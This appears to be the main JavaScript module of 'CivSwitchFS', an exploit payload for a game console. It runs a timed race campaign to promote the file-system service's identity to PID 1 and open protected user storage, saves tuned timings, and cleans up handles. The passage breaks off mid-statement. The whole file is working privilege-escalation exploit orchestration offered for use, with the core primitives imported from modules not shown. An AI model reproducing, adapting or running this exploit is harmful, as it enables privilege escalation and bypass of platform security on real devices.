// CivSwitchFS — FS identity-promotion payload
//
// Promotes fsp-srv identity to PID 1, opens User content storage, lists /,
// retains the promoted session and candidate storage, and cleans up other handles.
// See README.md and HOW_IT_WORKS.md for full details.

import coreRuntime, {setLogPolicy, waitMs} from "./core/runtime.mjs";
import {createFspIdentityConfig, VERBOSE_LOGGING} from "./core/config.mjs";
import {
  borrowRawThreadScheduling,
  openFspSessions,
  createScratchTree,
  openStorageAndClones,
  openTriggerHandles,
  allocatePacketBuffers,
  buildIpcRequests,
  checkPathPair,
  applyCmifContexts,
  prepareWaveInfrastructure
} from "./core/steps/setup.mjs";
import {
    runControlWaveLoop,
    WINDOW_RATE_THRESHOLD
} from "./core/steps/campaign.mjs";
import {
  preparePostCanaryCandidate,
  installCacheAlias
} from "./core/steps/alias.mjs";
import {
  prepareReleaseNeighbors,
  captureReleaseBaseline,
  releaseNeighborsAndFindPointers,
  qualifyAddressPlan
} from "./core/steps/discovery.mjs";
import {
  retireCandidateCacheAndClose,
  cleanupScratchAndHandles
} from "./core/steps/cleanup.mjs";
import {createFspIdentityHelpers} from "./core/helpers/index.mjs";
import {runPromotionStep} from "./core/promotion.mjs";
import {
    formatAddressResults,
    formatAliasResult,
    formatAliasTiming,
    formatCanaryResult,
    formatCleanupResult,
    formatCode,
    formatFailureSuffix,
    formatPromotionResult,
    formatRetirementResult
} from "./core/log-format.mjs";
import {
    setVerboseLogging,
    isVerboseLogging,
    stageOnlyLog,
    emitStage,
    emitVerboseStage
} from "./core/log-stage.mjs";
import {
    clearVisualLog,
    installRunInputControls,
    installVisualLogPatch
} from "./core/visuals.mjs";

const {
    allocPage,
    beginAllocationTracking,
    checkWindow,
    closeHandle,
    cloneObject,
    cmifReply,
    endAllocationTracking,
    extractRoleTimings,
    freeTrackedAllocations,
    getMountHandle,
    ipcCommitChecked,
    ipcCreateDirectoryChecked,
    ipcDeleteFileChecked,
    ipcDeleteDirectoryRecursivelyChecked,
    ipcGetEntryTypeChecked,
    ipcReadFileChecked,
    ipcRenameFileChecked,
    ipcWriteFileChecked,
    prepPacket,
    read32,
    sendIPC,
    write32,
    writeStr,
    writeXDesc
} = coreRuntime;

const BASE_ATTEMPTS = 10;
const MAX_TOTAL_ATTEMPTS = 30;
const RETRY_PAUSE_MS = 250;
const SCRATCH_DIR = "/hole";
const NOT_FOUND = 0x202;
const TIMING_SAVE_DIR = "/civswitchfs";
const TIMING_SAVE_PATH = TIMING_SAVE_DIR + "/timings.json";
const TIMING_SAVE_TEMP_PATH = TIMING_SAVE_PATH + ".tmp";
const TIMING_SAVE_DISPLAY_PATH = "save:" + TIMING_SAVE_PATH;
const TIMING_SAVE_VERSION = 1;
const MAX_TIMING_SAVE_BYTES = 1024;
const MAX_TIMING_DELAY_NS = 10000000;

// ---------------------------------------------------------------------------
// Entry point (bounded retry loop)
// ---------------------------------------------------------------------------

export async function run() {
    installVisualLogPatch();
    const previousVerboseLogging = setVerboseLogging(VERBOSE_LOGGING);
    const previousLogPolicy = setLogPolicy(stageOnlyLog);
    const timingPersistence = {
        checked: false,
        loaded: false,
        adjustedThisRun: false,
        savedThisRun: false,
        deletedThisRun: false,
        resetRequested: false,
        resetPending: false,
        useDefaultsThisAttempt: false,
        stopRequested: false,
        saveError: null,
        resetLogPromise: Promise.resolve(),
        stopLogPromise: Promise.resolve(),
        verbosityLogPromise: Promise.resolve()
    };
    const defaultTimingConfig = createFspIdentityConfig();
    const builtInTimingSchedule = {
        roleDelays: defaultTimingConfig.roleDelays.slice(),
        guardDelays: defaultTimingConfig.guardDelays.slice(),
        baselineRoleDelays: defaultTimingConfig.roleDelays.slice(),
        baselineGuardDelays: defaultTimingConfig.guardDelays.slice()
    };
    let inputControls = null;

    try {
        function queueVerbosityMessage(message) {
            timingPersistence.verbosityLogPromise =
                timingPersistence.verbosityLogPromise.then(() => emitStage(message))
                    .catch(() => {});
        }

        inputControls = installRunInputControls({
            onToggleVerbose() {
                const enabled = !isVerboseLogging();
                setVerboseLogging(enabled);
                queueVerbosityMessage(enabled
                    ? "Verbose logging enabled (controller Y switches to normal)."
                    : "Normal logging enabled.");
            },
            onResetTimings() {
                timingPersistence.resetRequested = true;
                timingPersistence.resetPending = true;
                timingPersistence.resetLogPromise =
                    timingPersistence.resetLogPromise.then(() => emitStage(
                        "X pressed: the next attempt, if one runs, will use built-in timings; " +
                        TIMING_SAVE_DISPLAY_PATH +
                        " will be deleted when this run ends.")
                    ).catch(() => {});
            },
            onStop() {
                if (timingPersistence.stopRequested) return;
                timingPersistence.stopRequested = true;
                timingPersistence.stopLogPromise = emitStage(
                    "B/cancel pressed: stop requested. The current wave, if any, will finish; " +
                    "no further waves or attempts will launch.")
                    .catch(() => {});
            }
        });

        let canaryTimingSchedule = null;
        let attemptLimit = BASE_ATTEMPTS;
        let positiveAttemptsTotal = 0;
        let positiveWindowsTotal = 0;

        await emitStage("CivSwitchFS (no RPC) by Nerisma\n" +
            "Thanks to Slapah (civ port)\n" +
            "Thanks to Pespipu (original ns2jb)\n" +
            "Thanks to Kurumuz (ns2jb improvements)");
        await emitStage(isVerboseLogging()
            ? "Verbose logging is on (controller Y toggles the mode)."
            : "Normal logging is on (controller Y enables verbose summaries).");
        await emitStage("Checking for saved timings...");
        for (let attempt = 1; attempt <= attemptLimit; attempt++) {
            if (timingPersistence.stopRequested) return;
            await emitStage("======== ATTEMPT " + attempt + " ========");
            if (timingPersistence.stopRequested) return;
            if (timingPersistence.resetPending) {
                canaryTimingSchedule = copyCanaryTimingSchedule(
                    builtInTimingSchedule);
                timingPersistence.resetPending = false;
                timingPersistence.useDefaultsThisAttempt = true;
            } else {
                timingPersistence.useDefaultsThisAttempt = false;
            }
            // The hard-cap attempt verifies the last schedule without retuning.
            const result = await runTrackedAttempt(canaryTimingSchedule,
                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence);
            positiveAttemptsTotal += result.positiveAttempts || 0;
            positiveWindowsTotal += result.positiveWindows || 0;

            if (timingPersistence.stopRequested || result.stoppedByUser)
                return;

            if (result.permissionProven) {
                if (result.promotionRestored && result.safeToRetry) {
                    await emitStage("Attempt complete.");
                }
                return;
            }

            if (!result.safeToRetry) {
                return;
            }

            canaryTimingSchedule = copyCanaryTimingSchedule(
                result.canaryTimingSchedule) || canaryTimingSchedule;

            if (result.timingAdjustments?.length) {
                const timingSource = result.timingAdjustments.some(
                    adjustment => adjustment.source === "control")
                    ? " from control waves" : "";
                if (attemptLimit < MAX_TOTAL_ATTEMPTS) {
                    attemptLimit++;
                    await emitStage("Timing changed" + timingSource +
                        "; extending the campaign to " +
                        attemptLimit + " attempts so the adjusted schedule can be tested.");
                } else if (attempt < MAX_TOTAL_ATTEMPTS) {
                    await emitStage("Timing changed" + timingSource + "; attempt " +
                        MAX_TOTAL_ATTEMPTS +
                        " is reserved to validate the adjusted schedule.");
                }
            }

            if (attempt === attemptLimit) {
                const rate = positiveAttemptsTotal > 0
                    ? positiveWindowsTotal / positiveAttemptsTotal : null;
                const windowSummary = positiveAttemptsTotal > 0
                    ? "Qualified windows: " + positiveWindowsTotal + "/" +
                      positiveAttemptsTotal + " (" +
                      (rate * 100).toFixed(0) + "%)."
                    : "No positive waves ran.";
                const restartHint = rate !== null &&
                    rate >= WINDOW_RATE_THRESHOLD
                    ? " Restart the game before another run."
                    : "";
                await emitStage("Stopped after " + attempt +
                    " attempts; user storage access was not verified. " +
                    windowSummary + restartHint);
                return;
            }

            await waitMs(RETRY_PAUSE_MS);
        }
    } catch (error) {
        await emitStage("Unexpected error. Checking cleanup status.");
        await emitVerboseStage("Workflow error: " + String(error?.message || error));
    } finally {
        await waitMs(0);
        try {
            await timingPersistence.verbosityLogPromise;
            if (timingPersistence.stopRequested)
                await timingPersistence.stopLogPromise;
            if (timingPersistence.resetRequested) {
                await timingPersistence.resetLogPromise;
                await emitStage("Deleting saved timing configuration...");
                let deleted;
                try {
                    deleted = deleteTimingScheduleFromFreshSaveHandle();
                } catch (error) {
                    deleted = {ok: false,
                        error: String(error?.message || error)};
                }
                if (deleted.ok) {
                    timingPersistence.deletedThisRun = true;
                    await emitStage(deleted.deletedPaths.length
                        ? "Deleted saved timing configuration from " +
                            TIMING_SAVE_DISPLAY_PATH + "."
                        : "No saved timing configuration remained at " +
                            TIMING_SAVE_DISPLAY_PATH + ".");
                } else {
                    await emitStage("Could not delete saved timing configuration from " +
                        TIMING_SAVE_DISPLAY_PATH + " (" + deleted.error + ").");
                }
                if (deleted.cleanupWarning)
                    await emitVerboseStage("Timing config deletion cleanup: " +
                        deleted.cleanupWarning);
            }
        } finally {
            inputControls?.clearRunActions?.();
            inputControls?.dispose?.();
            setLogPolicy(previousLogPolicy);
            setVerboseLogging(previousVerboseLogging);
        }
    }
}

function copyCanaryTimingSchedule(schedule) {
    if (!schedule || !Array.isArray(schedule.roleDelays) ||
        !Array.isArray(schedule.guardDelays) ||
        !Array.isArray(schedule.baselineRoleDelays) ||
        !Array.isArray(schedule.baselineGuardDelays)) return null;
    return {
        roleDelays: schedule.roleDelays.slice(),
        guardDelays: schedule.guardDelays.slice(),
        baselineRoleDelays: schedule.baselineRoleDelays.slice(),
        baselineGuardDelays: schedule.baselineGuardDelays.slice()
    };
}

function formatFinalTimingSchedule(schedule, timingPersistence) {
    if (!schedule || !isValidTimingValues(
        schedule.roleDelays, schedule.guardDelays)) {
        return ["Final timing values are unavailable."];
    }

    if (timingPersistence?.resetRequested) {
        return [];
    }

    if (timingPersistence?.adjustedThisRun &&
        !timingPersistence.savedThisRun) {
        return [
            "Adjusted timings could not be saved to " +
                TIMING_SAVE_DISPLAY_PATH + "; current values:",
            "var roleDelays = [" + schedule.roleDelays.join(", ") + "];",
            "var guardDelays = [" + schedule.guardDelays.join(", ") + "];"
        ];
    }

    if (timingPersistence?.savedThisRun || timingPersistence?.loaded) {
        return ["Adjusted timings have been saved in " +
            TIMING_SAVE_DISPLAY_PATH + "."];
    }

    return [];
}

async function beginCleanupLog(attemptState) {
    if (attemptState.cleanupLogStarted) return;
    attemptState.cleanupLogStarted = true;
    await emitStage("Cleaning up...");
}

function isValidTimingArray(values, expectedLength) {
    if (!Array.isArray(values) || values.length !== expectedLength ||
        !values.every(value => Number.isSafeInteger(value) && value >= 0 &&
            value <= MAX_TIMING_DELAY_NS)) return false;
    for (let i = 1; i < values.length; i++)
        if (values[i] - values[i - 1] < 50000) return false;
    return true;
}

function isValidTimingValues(roleDelays, guardDelays) {
    return isValidTimingArray(roleDelays, 10) &&
        isValidTimingArray(guardDelays, 2);
}

function loadTimingScheduleFromSave(handle) {
    if (!handle) return {status: "unavailable", detail: "save handle unavailable"};

    let result = {status: "unavailable", detail: "timing file unavailable"};
    try {
        const entry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
        if (entry.transport !== 0) {
            result = {status: "unavailable", detail: "entry transport " +
                timingHex(entry.transport)};
        } else if (entry.result === NOT_FOUND) {
            result = {status: "missing"};
        } else if (entry.result !== 0) {
            result = {status: "unavailable", detail: "entry result " +
                timingHex(entry.result)};
        } else if (entry.type !== 1) {
            result = {status: "invalid", detail: "timing path is not a file"};
        } else {
            const read = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
                MAX_TIMING_SAVE_BYTES);
            if (!read.ok) {
                result = {status: "invalid", detail: "read " + read.stage +
                    (read.transport !== null && read.transport !== 0
                        ? " transport " + timingHex(read.transport) : "") +
                    (read.result !== null && read.result !== 0
                        ? " result " + timingHex(read.result) : "")};
            } else {
                let json = "";
                for (const byte of read.bytes)
                    json += String.fromCharCode(byte);
                const data = JSON.parse(json);
                if (data?.version !== TIMING_SAVE_VERSION ||
                    !isValidTimingValues(data.roleDelays, data.guardDelays)) {
                    result = {status: "invalid",
                        detail: "unsupported or invalid timing data"};
                } else {
                    result = {status: "loaded", schedule: {
                        roleDelays: data.roleDelays.slice(),
                        guardDelays: data.guardDelays.slice()
                    }};
                }
            }
        }
    } catch (error) {
        result = {status: "invalid", detail: String(error?.message || error)};
    }
    return result;
}

function persistTimingSchedule(handle, schedule) {
    if (!handle || !schedule || !isValidTimingValues(
        schedule.roleDelays, schedule.guardDelays)) {
        return {ok: false, error: "invalid timing schedule or save handle"};
    }

    try {
        const directory = ipcGetEntryTypeChecked(handle, TIMING_SAVE_DIR);
        if (directory.transport !== 0)
            throw new Error("directory transport " + timingHex(directory.transport));
        if (directory.result === NOT_FOUND) {
            requireTimingFsSuccess("create directory",
                ipcCreateDirectoryChecked(handle, TIMING_SAVE_DIR));
        } else if (directory.result !== 0) {
            throw new Error("directory result " + timingHex(directory.result));
        } else if (directory.type !== 0) {
            throw new Error("timing directory path is not a directory");
        }

        const tempEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_TEMP_PATH);
        if (tempEntry.transport !== 0)
            throw new Error("temporary entry transport " + timingHex(tempEntry.transport));
        if (tempEntry.result === 0) {
            if (tempEntry.type !== 1)
                throw new Error("temporary timing path is not a file");
            requireTimingFsSuccess("remove stale temporary file",
                ipcDeleteFileChecked(handle, TIMING_SAVE_TEMP_PATH));
        } else if (tempEntry.result !== NOT_FOUND) {
            throw new Error("temporary entry result " + timingHex(tempEntry.result));
        }

        const serialized = JSON.stringify({version: TIMING_SAVE_VERSION,
            roleDelays: schedule.roleDelays,
            guardDelays: schedule.guardDelays});
        const bytes = [];
        for (let i = 0; i < serialized.length; i++)
            bytes.push(serialized.charCodeAt(i));
        const written = ipcWriteFileChecked(handle, TIMING_SAVE_TEMP_PATH, bytes);
        if (!written.ok)
            throw new Error("write temporary file " + written.stage +
                (written.transport !== null && written.transport !== 0
                    ? " transport " + timingHex(written.transport) : "") +
                (written.result !== null && written.result !== 0
                    ? " result " + timingHex(written.result) : ""));

        const staged = ipcReadFileChecked(handle, TIMING_SAVE_TEMP_PATH,
            MAX_TIMING_SAVE_BYTES);
        if (!staged.ok)
            throw new Error("temporary file readback " + staged.stage +
                (staged.transport !== null && staged.transport !== 0
                    ? " transport " + timingHex(staged.transport) : "") +
                (staged.result !== null && staged.result !== 0
                    ? " result " + timingHex(staged.result) : ""));
        const stagedMismatch = timingBytesMismatch(bytes, staged.bytes);
        if (stagedMismatch)
            throw new Error("temporary file readback mismatch: " + stagedMismatch);

        const targetEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
        if (targetEntry.transport !== 0)
            throw new Error("target entry transport " + timingHex(targetEntry.transport));
        if (targetEntry.result === 0) {
            if (targetEntry.type !== 1)
                throw new Error("timing save path is not a file");
            requireTimingFsSuccess("remove old timing file",
                ipcDeleteFileChecked(handle, TIMING_SAVE_PATH));
        } else if (targetEntry.result !== NOT_FOUND) {
            throw new Error("target entry result " + timingHex(targetEntry.result));
        }

        requireTimingFsSuccess("publish timing file",
            ipcRenameFileChecked(handle, TIMING_SAVE_TEMP_PATH,
                TIMING_SAVE_PATH));
        requireTimingFsSuccess("commit timing file", ipcCommitChecked(handle));

        const saved = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
            MAX_TIMING_SAVE_BYTES);
        if (!saved.ok)
            throw new Error("saved timing file readback " + saved.stage +
                (saved.transport !== null && saved.transport !== 0
                    ? " transport " + timingHex(saved.transport) : "") +
                (saved.result !== null && saved.result !== 0
                    ? " result " + timingHex(saved.result) : ""));
        const savedMismatch = timingBytesMismatch(bytes, saved.bytes);
        if (savedMismatch)
            throw new Error("saved timing file readback mismatch: " + savedMismatch);
        return {ok: true};
    } catch (error) {
        return {ok: false, error: String(error?.message || error)};
    }
}

function persistTimingScheduleFromFreshSaveHandle(schedule) {
    const tracker = beginAllocationTracking();
    if (!tracker)
        return {ok: false, error: "could not start save allocation tracking"};

    let handle = 0;
    let result = {ok: false, error: "save mount unavailable"};
    let cleanupWarning = null;
    try {
        const mount = getMountHandle("save");
        if (!mount) throw new Error("save mount unavailable");
        handle = cloneObject(mount.handle, mount.objId);
        if (!handle) throw new Error("could not clone save mount");
        result = persistTimingSchedule(handle, schedule);
    } catch (error) {
        result = {ok: false, error: String(error?.message || error)};
    } finally {
        if (handle) {
            try {
                const closeResult = Number(closeHandle(handle)) >>> 0;
                if (closeResult !== 0)
                    cleanupWarning = "save handle close " + timingHex(closeResult);
            } catch (error) {
                cleanupWarning = "save handle close threw: " +
                    String(error?.message || error);
            }
        }

        if (!endAllocationTracking(tracker)) {
            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
                "save allocation tracking did not end cleanly";
        } else {
            const freed = freeTrackedAllocations(tracker);
            if (!freed.ok)
                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
                    "save buffer cleanup failed";
        }
    }

    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
    return result;
}

function deleteTimingSchedule(handle) {
    if (!handle) return {ok: false, error: "save handle unavailable"};

    const deletedPaths = [];
    const errors = [];
    for (const path of [TIMING_SAVE_PATH, TIMING_SAVE_TEMP_PATH]) {
        try {
            const entry = ipcGetEntryTypeChecked(handle, path);
            if (entry.transport !== 0)
                throw new Error("entry transport " + timingHex(entry.transport));
            if (entry.result === NOT_FOUND) continue;
            if (entry.result !== 0)
                throw new Error("entry result " + timingHex(entry.result));
            if (entry.type !== 1)
                throw new Error("timing path is not a file: " + path);

            requireTimingFsSuccess("delete " + path,
                ipcDeleteFileChecked(handle, path));
            deletedPaths.push(path);
        } catch (error) {
            errors.push(path + ": " + String(error?.message || error));
        }
    }

    if (deletedPaths.length) {
        try {
            requireTimingFsSuccess("commit timing config deletion",
                ipcCommitChecked(handle));
        } catch (error) {
            errors.push(String(error?.message || error));
        }
        for (const path of deletedPaths) {
            try {
                const entry = ipcGetEntryTypeChecked(handle, path);
                if (entry.transport !== 0)
                    throw new Error("verify deletion transport " +
                        timingHex(entry.transport));
                if (entry.result !== NOT_FOUND)
                    throw new Error("verify deletion result " +
                        timingHex(entry.result));
            } catch (error) {
                errors.push("verify " + path + ": " +
                    String(error?.message || error));
            }
        }
    }

    return errors.length
        ? {ok: false, error: errors.join("; "), deletedPaths}
        : {ok: true, deletedPaths};
}

function deleteTimingScheduleFromFreshSaveHandle() {
    const tracker = beginAllocationTracking();
    if (!tracker)
        return {ok: false, error: "could not start save allocation tracking"};

    let handle = 0;
    let result = {ok: false, error: "save mount unavailable"};
    let cleanupWarning = null;
    try {
        const mount = getMountHandle("save");
        if (!mount) throw new Error("save mount unavailable");
        handle = cloneObject(mount.handle, mount.objId);
        if (!handle) throw new Error("could not clone save mount");
        result = deleteTimingSchedule(handle);
    } catch (error) {
        result = {ok: false, error: String(error?.message || error)};
    } finally {
        if (handle) {
            try {
                const closeResult = Number(closeHandle(handle)) >>> 0;
                if (closeResult !== 0)
                    cleanupWarning = "save handle close " + timingHex(closeResult);
            } catch (error) {
                cleanupWarning = "save handle close threw: " +
                    String(error?.message || error);
            }
        }

        if (!endAllocationTracking(tracker)) {
            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
                "save allocation tracking did not end cleanly";
        } else {
            const freed = freeTrackedAllocations(tracker);
            if (!freed.ok)
                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
                    "save buffer cleanup failed";
        }
    }

    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
    return result;
}

function requireTimingFsSuccess(operation, reply) {
    if (reply.transport !== 0)
        throw new Error(operation + " transport " + timingHex(reply.transport));
    if (reply.result !== 0)
        throw new Error(operation + " result " + timingHex(reply.result));
}

function timingBytesMismatch(expected, actual) {
    if (!actual) return "no bytes returned";
    if (expected.length !== actual.length)
        return "length expected " + expected.length + ", got " + actual.length;
    for (let i = 0; i < expected.length; i++) {
        if (expected[i] !== actual[i])
            return "byte " + i + " expected " + timingByteHex(expected[i]) +
                ", got " + timingByteHex(actual[i]);
    }
    return null;
}

function timingByteHex(value) {
    return "0x" + (Number(value) & 0xFF).toString(16).padStart(2, "0");
}

function timingHex(value) {
    return "0x" + (Number(value) >>> 0).toString(16).padStart(8, "0");
}

function reportAddressProgress(message) {
    if (typeof message !== "string") return Promise.resolve();

    const concisePrefix = "ADDRESS_SCAN:";
    if (message.startsWith(concisePrefix))
        return emitStage(message.slice(concisePrefix.length).trim());
    if (message.startsWith("FSP root capture and scan in progress:"))
        return emitStage("FSP root identity scan is halfway complete.");
    return Promise.resolve();
}


// ---------------------------------------------------------------------------
// Tracked attempt (one full attempt with allocation tracking)
// ---------------------------------------------------------------------------

async function runTrackedAttempt(canaryTimingSchedule,
    allowTimingAdjustments = true, timingPersistence = null) {
    const attemptState = {
        permissionProven: false,
        stoppedByUser: false,
        pidPromotionVerified: false,
        canaryTimingSchedule: copyCanaryTimingSchedule(canaryTimingSchedule),
        positiveAttempts: 0,
        positiveWindows: 0,
        timingAdjustments: [],
        promotionRestored: false,
        cleanupVerified: false,
        workerStateSafe: true,
        workersQuiesced: true,
        safeToRetry: false,
        cleanupSummary: "no cleanup record",
        memoryCleanupVerified: false,
        nativeMemory: null,
        promotionRetained: false,
        lightCleanupVerified: false,
        holeCleanupHandle: 0,
        holeAbsentVerified: false,
        holeCleanupVerified: false,
        primaryCleanupAttempted: false,
        primaryCommitVerified: false,
        primaryScratchCleanupVerified: false,
        primaryHandlesClosed: false,
        endpointRetirementVerified: false,
        cacheRetirementVerified: true,
        candidateCacheRetirementRequired: false,
        retainedEndpointActive: false,
        cleanupLogStarted: false
    };

    const tracker = beginAllocationTracking();
    if (!tracker) {
        await emitStage("Could not start an attempt. Stopping.");
        return attemptState;
    }

    let trackingEnded = false;
    let executionError = null;

    try {
        await runPayload(attemptState, allowTimingAdjustments,
            timingPersistence);
    } catch (error) {
        const errorName = error?.name && error.name !== "Error"
            ? error.name + ": " : "";
        executionError = errorName + String(error?.message || error);
        await emitStage("Attempt failed: " + executionError +
            "; checking cleanup.");
        await emitVerboseStage("Attempt error: " + executionError);
    } finally {
        try {
            await beginCleanupLog(attemptState);
            await runHoleCleanupHandler(attemptState);
        } catch (error) {
            executionError = executionError ||
                "independent /hole cleanup threw: " +
                String(error?.message || error);
            await emitVerboseStage("Cleanup error: " + executionError);
        } finally {
            trackingEnded = endAllocationTracking(tracker);
        }
    }

    // Client-side buffers only need to outlive their workers and any retained
    // endpoint. Handle-close and scratch-cleanup failures do not keep those
    // buffers in use once all synchronous requests have returned.
    let nativeMemory = {ok: false, attempted: tracker.length,
        callsCompleted: 0, errors: [], skipped: true};

    if (!attemptState.promotionRetained &&
        !attemptState.retainedEndpointActive &&
        attemptState.workersQuiesced && trackingEnded) {
        try {
            nativeMemory = {...freeTrackedAllocations(tracker), skipped: false};
        } catch (error) {
            nativeMemory = {ok: false, attempted: tracker.length,
                callsCompleted: 0, errors: [String(error)], skipped: false};
        }
    }

    attemptState.nativeMemory = nativeMemory;
    attemptState.memoryCleanupVerified = Boolean(trackingEnded && nativeMemory.ok);
    attemptState.safeToRetry = Boolean(!attemptState.promotionRetained &&
        !attemptState.pidPromotionVerified &&
        !attemptState.retainedEndpointActive &&
        attemptState.cacheRetirementVerified &&
        attemptState.workerStateSafe && attemptState.workersQuiesced &&
        attemptState.holeAbsentVerified && trackingEnded && nativeMemory.ok);

    if (attemptState.promotionRetained) {
        const lightCleanupComplete = attemptState.lightCleanupVerified &&
            attemptState.holeCleanupVerified && trackingEnded;
        await emitStage(lightCleanupComplete
            ? "Temporary handles closed; fspSrv and candidate storage remain open."
            : "Cleanup incomplete; fspSrv and candidate storage remain open.");
    } else if (attemptState.pidPromotionVerified) {
        const cleanupComplete = attemptState.cleanupVerified &&
            attemptState.holeCleanupVerified && trackingEnded &&
            attemptState.promotionTestHandlesClosed;
        await emitStage(cleanupComplete
            ? "Promotion complete; temporary handles closed; PID fields remain promoted."
            : "Promotion complete; cleanup incomplete; PID fields remain promoted.");
    } else if (attemptState.safeToRetry) {
        await emitStage(attemptState.cleanupVerified
            ? "Cleanup complete."
            : "Cleanup is sufficient for another attempt.");
    } else {
        await emitStage("Cleanup failed; another attempt is unsafe.");
    }

    if (executionError)
        await emitVerboseStage("Attempt ended after an error; retry checks are incomplete.");

    const completedWithCleanSession = Boolean(
        !executionError &&
        attemptState.permissionProven &&
        attemptState.promotionRetained &&
        attemptState.lightCleanupVerified &&
        attemptState.holeCleanupVerified &&
        trackingEnded);
    if (completedWithCleanSession) {
        if (!timingPersistence?.resetRequested)
            await clearVisualLog();
        await emitStage("You just Civ Sevened your machine, congrats");
        if (timingPersistence?.adjustedThisRun &&
            !timingPersistence.resetRequested &&
            !timingPersistence.savedThisRun) {
            await emitStage("Saving adjusted timings...");
            const saved = persistTimingScheduleFromFreshSaveHandle(
                attemptState.canaryTimingSchedule);
            if (saved.ok) {
                timingPersistence.savedThisRun = true;
                timingPersistence.saveError = null;
                if (saved.cleanupWarning)
                    await emitVerboseStage("Timing save cleanup: " +
                        saved.cleanupWarning);
            } else {
                timingPersistence.saveError = saved.error;
                await emitStage("Could not save adjusted timings (" +
                    saved.error + "); keeping them for this run.");
                if (saved.cleanupWarning)
                    await emitVerboseStage("Timing save cleanup: " +
                        saved.cleanupWarning);
            }
        }
        for (const line of formatFinalTimingSchedule(
            attemptState.canaryTimingSchedule, timingPersistence)) {
            await emitStage(line);
        }
    }

    return attemptState;
}


// ---------------------------------------------------------------------------
// Main payload (single attempt)
// ---------------------------------------------------------------------------

async function runPayload(attemptState, allowTimingAdjustments = true,
    timingPersistence = null) {
    const config = createFspIdentityConfig();
    const timingBaseline = {
        roleDelays: config.roleDelays.slice(),
        guardDelays: config.guardDelays.slice()
    };
    const carriedSchedule = copyCanaryTimingSchedule(
        attemptState.canaryTimingSchedule);
    if (!timingPersistence?.useDefaultsThisAttempt && carriedSchedule &&
        carriedSchedule.roleDelays.length === config.roleDelays.length &&
        carriedSchedule.guardDelays.length === config.guardDelays.length &&
        carriedSchedule.baselineRoleDelays.length === config.roleDelays.length &&
        carriedSchedule.baselineGuardDelays.length === config.guardDelays.length) {
        config.roleDelays.splice(0, config.roleDelays.length,
            ...carriedSchedule.roleDelays);
        config.guardDelays.splice(0, config.guardDelays.length,
            ...carriedSchedule.guardDelays);
        timingBaseline.roleDelays = carriedSchedule.baselineRoleDelays;
        timingBaseline.guardDelays = carriedSchedule.baselineGuardDelays;
    }
    const helpers = createFspIdentityHelpers({
        optimizeRootCandidateScan: true,
        collectRootScanTiming: true
    });

    if (typeof checkWindow !== "function" ||
        typeof extractRoleTimings !== "function") {
        await emitStage("Timing support is unavailable. Stopping.");
        return;
    }

    // -- Phase 1: FSP and save resources --------------------------------

    await emitStage("Preparing file-system access and save data...");

    const schedulingResult = await borrowRawThreadScheduling();
    if (!schedulingResult?.ok) {
        await emitStage("Could not prepare worker scheduling.");
        await emitVerboseStage(formatFailureSuffix(schedulingResult));
        return;
    }
    const {rawScheduling} = schedulingResult;

    const sessionSetup = await openFspSessions({helpers});
    if (!sessionSetup?.ok) {
        await emitStage("Could not open the required file systems.");
        await emitVerboseStage(formatFailureSuffix(sessionSetup));
        return;
    }

    let handles = {...sessionSetup.handles,
        preserveTemporaryHandleForCleanup: true};
    attemptState.holeCleanupHandle = handles.temporaryHandle || 0;

    if (!attemptState.holeCleanupHandle) {
        await emitStage("Cleanup access is unavailable. Stopping safely.");
        await beginCleanupLog(attemptState);
        helpers.cleanup(handles);
        return;
    }

    if (timingPersistence && !timingPersistence.checked) {
        timingPersistence.checked = true;
        if (timingPersistence.useDefaultsThisAttempt) {
            const defaults = createFspIdentityConfig();
            config.roleDelays.splice(0, config.roleDelays.length,
                ...defaults.roleDelays);
            config.guardDelays.splice(0, config.guardDelays.length,
                ...defaults.guardDelays);
            timingBaseline.roleDelays = defaults.roleDelays.slice();
            timingBaseline.guardDelays = defaults.guardDelays.slice();
            attemptState.canaryTimingSchedule = {
                roleDelays: defaults.roleDelays.slice(),
                guardDelays: defaults.guardDelays.slice(),
                baselineRoleDelays: defaults.roleDelays.slice(),
                baselineGuardDelays: defaults.guardDelays.slice()
            };
            await emitStage("X reset requested before timing load; using built-in timings.");
        } else {
            const timingLoad = loadTimingScheduleFromSave(handles.savedHandle);
            if (timingLoad.status === "loaded") {
                config.roleDelays.splice(0, config.roleDelays.length,
                    ...timingLoad.schedule.roleDelays);
                config.guardDelays.splice(0, config.guardDelays.length,
                    ...timingLoad.schedule.guardDelays);
                attemptState.canaryTimingSchedule = {
                    roleDelays: timingLoad.schedule.roleDelays.slice(),
                    guardDelays: timingLoad.schedule.guardDelays.slice(),
                    baselineRoleDelays: timingBaseline.roleDelays.slice(),
                    baselineGuardDelays: timingBaseline.guardDelays.slice()
                };
                timingPersistence.loaded = true;
                await emitStage("Loaded saved timings from " +
                    TIMING_SAVE_DISPLAY_PATH + ".");
            } else if (timingLoad.status === "missing") {
                await emitStage("No saved timing file found; using built-in timings.");
            } else {
                await emitStage("Could not load saved timings; using built-in timings.");
                if (timingLoad.detail)
                    await emitVerboseStage("Timing load: " + timingLoad.detail);
            }
        }
    }

    const {pktBuf} = sessionSetup;

    const scratch = await createScratchTree({
        config, helpers,
        savedHandle: handles.savedHandle,
        temporaryHandle: handles.temporaryHandle,
        handleResources: handles
    });
    if (!scratch?.ok) {
        await emitStage("Could not prepare temporary save data.");
        await emitVerboseStage(formatFailureSuffix(scratch));
        return;
    }

    // -- Guarded cleanup wrapper ----------------------------------------

    let cleanupAttempted = false;
    let cleanupWorkerStateSafe = true;
    let addressCopy = null;

    const stopAndCleanup = async options => {
        cleanupAttempted = true;
        await beginCleanupLog(attemptState);
        await emitVerboseStage("Stopping reason: " + options.reason);
        // Cleanup may itself launch cache-retirement waves. If that throws,
        // keep the allocation scope alive because a worker may still use it.
        attemptState.workersQuiesced = false;
        const cleanupOptions = {...options,
            candidateCacheNeedsRetirement: Boolean(
                options.candidateCacheNeedsRetirement ||
